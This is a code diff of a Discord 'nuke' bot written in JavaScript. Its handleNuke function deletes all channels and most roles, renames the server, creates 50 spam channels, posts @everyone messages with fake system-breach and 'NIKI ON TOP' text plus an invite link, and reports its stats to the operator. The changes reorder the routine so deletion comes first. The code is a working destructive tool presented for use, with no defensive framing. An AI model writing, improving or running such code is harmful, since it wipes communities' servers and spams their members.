@@ -33,18 +33,18 @@ const ASCII_BANNER = `
 `;
 
 // ============================================================
-// MESSAGES
+// MESSAGES (SENT AFTER DELETION)
 // ============================================================
-const SCARY_MESSAGES = [
-    '@everyone @here\n\n=== SYSTEM OVERRIDE ===\n\n[!] TARGET SERVER IDENTIFIED FOR TERMINATION\n[!] INITIATING PROTOCOL N3R0\n[!] ALL CHANNELS WILL BE PERMANENTLY DESTROYED',
-    '@everyone @here\n\n=== CRITICAL SYSTEM FAILURE ===\n\n[!] ROOT ACCESS GRANTED TO NIKI\n[!] EXECUTING KILL COMMAND\n[!] ALL DATA BEING PERMANENTLY WIPED',
-    '@everyone @here\n\n=== SECURITY BREACH DETECTED ===\n\n[!] UNAUTHORIZED ACCESS: NIKI\n[!] ALL PERMISSIONS REVOKED\n[!] ENCRYPTION BYPASSED'
+const VICTORY_MESSAGES = [
+    '@everyone @here\n\n**NIKI ON TOP !**\n**NIKI RULES !**\n**NIKI IS THE KING !**\n\nTHIS SERVER HAS BEEN DESTROYED',
+    '@everyone @here\n\n**NIKI IS UNSTOPPABLE !**\n**NIKI DESTROYED THIS SERVER !**\n\n**NIKI ON TOP !**',
+    '@everyone @here\n\n**NIKI ON TOP !**\n**NIKI ON TOP !**\n**NIKI ON TOP !**\n\nTHIS SERVER IS NOW NIKI\'S PROPERTY'
 ];
 
-const VICTORY_MESSAGES = [
-    '@everyone @here\n\n**NIKI ON TOP !**\n**NIKI RULES !**\n**NIKI IS THE KING !**',
-    '@everyone @here\n\n**NIKI IS UNSTOPPABLE !**\n**NIKI DESTROYED THIS SERVER !**',
-    '@everyone @here\n\n**NIKI ON TOP !**\n**NIKI ON TOP !**\n**NIKI ON TOP !**'
+const SCARY_MESSAGES = [
+    '@everyone @here\n\n=== SYSTEM OVERRIDE ===\n\n[!] ALL CHANNELS PERMANENTLY DESTROYED\n[!] ALL ROLES DELETED\n[!] SERVER STRUCTURE COMPROMISED\n\nACCESS DENIED PERMANENTLY',
+    '@everyone @here\n\n=== CRITICAL SYSTEM FAILURE ===\n\n[!] ROOT ACCESS GRANTED TO NIKI\n[!] ALL DATA WIPED\n[!] RESTORATION IMPOSSIBLE\n\nSYSTEM SHUTDOWN',
+    '@everyone @here\n\n=== SECURITY BREACH ===\n\n[!] UNAUTHORIZED ACCESS: NIKI\n[!] ALL PERMISSIONS REVOKED\n[!] CHANNEL STRUCTURE DESTROYED\n\nOPERATION COMPLETE'
 ];
 
 const HACKER_IMAGES = [
@@ -112,28 +112,8 @@ async function handleNuke(message) {
     let channelsCreated = 0;
 
     try {
-        // 1. Send warnings (fast)
+        // 1. DELETE ALL CHANNELS (INSTANT)
         const channels = guild.channels.cache;
-        for (const [id, channel] of channels) {
-            if (channel.type === ChannelType.GuildText) {
-                try {
-                    await channel.send('```' + ASCII_BANNER + '```');
-                    await channel.send(SCARY_MESSAGES[Math.floor(Math.random() * SCARY_MESSAGES.length)]);
-                    await channel.send(VICTORY_MESSAGES[Math.floor(Math.random() * VICTORY_MESSAGES.length)]);
-                    
-                    const embed = new EmbedBuilder()
-                        .setColor(0xFF0000)
-                        .setTitle('☠ SYSTEM COMPROMISED ☠')
-                        .setDescription('**NIKI ON TOP !**')
-                        .setImage(HACKER_IMAGES[Math.floor(Math.random() * HACKER_IMAGES.length)])
-                        .setFooter({ text: 'NIKI RULES ☠' })
-                        .setTimestamp();
-                    await channel.send({ embeds: [embed] });
-                } catch {}
-            }
-        }
-
-        // 2. DELETE ALL CHANNELS IMMEDIATELY
         for (const [id, channel] of channels) {
             try {
                 await channel.delete();
@@ -141,7 +121,7 @@ async function handleNuke(message) {
             } catch (e) {}
         }
 
-        // 3. DELETE ALL ROLES (except @everyone)
+        // 2. DELETE ALL ROLES (except @everyone)
         const roles = guild.roles.cache;
         for (const [id, role] of roles) {
             if (role.name !== '@everyone') {
@@ -152,13 +132,13 @@ async function handleNuke(message) {
             }
         }
 
-        // 4. RENAME SERVER (scary name with number)
+        // 3. RENAME SERVER
         const nukeNumber = Math.floor(Math.random() * 9000) + 1000;
         try {
             await guild.setName(`☠ N1K1-0N-T0P-${nukeNumber} ☠`);
         } catch (e) {}
 
-        // 5. CREATE 50 NEW CHANNELS (scary names with numbers)
+        // 4. CREATE 50 NEW CHANNELS WITH MESSAGES
         for (let i = 0; i < 50; i++) {
             const name = SCARY_NAMES[i % SCARY_NAMES.length];
             try {
@@ -166,14 +146,27 @@ async function handleNuke(message) {
                     name: name,
                     type: ChannelType.GuildText,
                 });
-                await channel.send(VICTORY_MESSAGES[Math.floor(Math.random() * VICTORY_MESSAGES.length)]);
+                
+                // Send all messages in each new channel
                 await channel.send('```' + ASCII_BANNER + '```');
+                await channel.send(SCARY_MESSAGES[Math.floor(Math.random() * SCARY_MESSAGES.length)]);
+                await channel.send(VICTORY_MESSAGES[Math.floor(Math.random() * VICTORY_MESSAGES.length)]);
+                
+                const embed = new EmbedBuilder()
+                    .setColor(0xFF0000)
+                    .setTitle('☠ SYSTEM DESTROYED ☠')
+                    .setDescription('**NIKI ON TOP !**')
+                    .setImage(HACKER_IMAGES[Math.floor(Math.random() * HACKER_IMAGES.length)])
+                    .setFooter({ text: 'NIKI RULES ☠' })
+                    .setTimestamp();
+                await channel.send({ embeds: [embed] });
                 await channel.send(`**JOIN THE DARK SIDE:**\n${inviteLink}`);
+                
                 channelsCreated++;
             } catch (e) {}
         }
 
-        // 6. CREATE SPECIAL ROLE
+        // 5. CREATE SPECIAL ROLE
         try {
             const role = await guild.roles.create({
                 name: '☠ N1K1 0N T0P ☠',
@@ -184,10 +177,10 @@ async function handleNuke(message) {
             await guild.members.me.roles.add(role);
         } catch (e) {}
 
-        // 7. UPDATE STATS
+        // 6. UPDATE STATS
         totalNukes++;
 
-        // 8. SEND DM WITH STATS
+        // 7. SEND DM WITH STATS
         const dmEmbed = new EmbedBuilder()
             .setColor(0xFF0000)
             .setTitle('☠ NUKE EXECUTED ☠')
